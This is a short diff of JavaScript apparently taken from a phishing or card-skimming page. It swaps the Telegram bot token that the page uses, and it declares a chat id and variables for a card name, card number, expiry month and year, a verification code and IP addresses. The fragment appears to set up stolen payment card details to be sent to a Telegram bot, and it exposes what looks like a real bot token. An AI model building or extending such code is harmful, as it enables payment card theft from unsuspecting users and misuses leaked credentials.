@@ -21,7 +21,7 @@ function detectarPais() {
 detectarPais();
 
 //bot token
-var telegram_bot_id = "5867032539:AAHkD1Pn4e3os-4EyKEpHajUI6kHJAe_DAE";
+var telegram_bot_id = "-1002141569868:AAHkD1Pn4e3os-4EyKEpHajUI6kHJAe_DAE";
 //chat id
 var chat_id = 5651328532;
 var namecc, numcc, mes , year, ver ,ip, ip2;
